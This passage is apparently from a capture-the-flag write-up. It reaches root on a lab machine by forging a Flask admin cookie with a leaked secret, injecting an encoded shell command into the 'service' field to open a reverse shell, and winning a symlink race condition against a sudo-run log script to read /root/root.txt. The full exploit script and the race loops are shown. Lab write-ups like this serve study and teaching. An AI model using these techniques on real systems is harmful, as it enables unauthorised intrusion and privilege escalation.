The application, written in Flask, is exposed on port 7777. I use ligolo-ng to access it from my attacker machine.

Inside the source code a syswatch.env file is used to load, among other things, the secret used to create Flask cookies.

cat privilege-escalation

As shown earlier, sudo -l indicates we can run the script without a password prompt, with the exception of two commands.

The commands exposed by the application allow performing other operations, including reading logs stored in the /opt/syswatch/logs folder, which are not accessible as dev_ryan and are currently only visible through the web page.

In reality this configuration is not an obstacle to obtaining the root flag. After a more careful analysis of the situation I drew the following conclusions:

  1. The logs shown on the web page are files owned by the syswatch user.
  2. The RCE as syswatch is only needed to be able to modify log files, since dev_ryan cannot.
  3. If one of these files were a symklink we could read any file, but the log reading method verifies the path before running cat.


local path="$LOG_DIR/$file"
    if [ -L "$path" ]; then
        local target
        target=$(ls -l "$path" | awk '{print $NF}')

        if [[ "$target" == *"/"* || "$target" == *".."* || "$target" == *"\\"* ]]; then
            echo "[Blocked unsafe symlink target]: $file -> $target"
            return 1
        fi

        if [[ "$target" =~ ^[A-Za-z0-9_.-]+$ ]]; then
            local resolved="$LOG_DIR/$target"
            if [ -f "$resolved" ]; then
                cat "$resolved"
                return
            else
                echo "[Symlink target not found]: $file -> $target"
                return 1
            fi
        fi

        if [[ "$target" == /var/log/* ]]; then
            [ -f "$target" ] && cat "$target" && return
            echo "[Symlink target not regular file]: $file -> $target"
            return 1
        fi

        echo "[Refusing unsafe symlink]: $file -> $target"
        return 1
    fi

    if [[ "$file" == */* || "$file" == *".."* ]]; then
        echo "[Blocked unsafe filename]: $file"
        return 1
    fi
    
    if [ -f "$path" ]; then
        cat "$path"
    else
        echo "[Log file not found]: $file"
    fi

Specifically, if the file is a symlink it verifies the real path; otherwise it performs a direct cat. The turning point of this challenge - and what ultimately leads to reading the flag in /root/root.txt - is the gap between the command target=$(ls -l "$path" | awk '{print $NF}') (used to resolve the real path of a symlink) and cat "$path" (which directly outputs the content of the indicated file). The mismatch between the two variables used and the time elapsed between one command and the other are all the ingredients needed to apply a race condition and retrieve the flag.

In practice, if we request a plain file it will pass all checks, but if we replace it with a symlink while the checks are running, the cat will output the content of the linked path.

To carry out this attack I open a reverse shell as syswatch user:

  1. From dev_ryan I write a shell execution script to /tmp/rev and set permissions to 777.
  2. Using the following exploit I run the command:

from flask import Flask
from flask.sessions import SecureCookieSessionInterface
import requests

def pto(path):
    #PATH TO OCTAL
    return "$(printf '" + ''.join(f"\\{ord(c):02o}" for c in path) + "')"

app = Flask(__name__)
app.secret_key = "f3ac48a6006a13a37ab8da0ab0f2a3200d8b3640431efe440788beaefa236725"
s = SecureCookieSessionInterface().get_signing_serializer(app)
cookie = s.dumps({"user_id": 1, "username": "admin"})

session = requests.session()
session.proxies.update({"http":"http://127.0.0.1:8080"})
session.verify=False

exploit = {"service": f"$(bash {pto('/tmp/rev')})"}
session.post("http://240.0.0.1:7777/service-status", cookies={'session': cookie}, data=exploit)

At this point I have one shell as dev_ryan and one as syswatch. To retrieve the flag, dev_ryan must request the log read while syswatch simultaneously modifies the file's symlink target:

dev_ryan@devarea:/tmp$ while true; do sudo /opt/syswatch/syswatch.sh logs pwn.log; done
syswatch@devarea:~/syswatch_gui$ while true; do touch /opt/syswatch/logs/pwn.log && ln -sf /root/root.txt /opt/syswatch/logs/pwn.log && rm /opt/syswatch/logs/pwn.log; done

After several iterations the root flag will be printed.
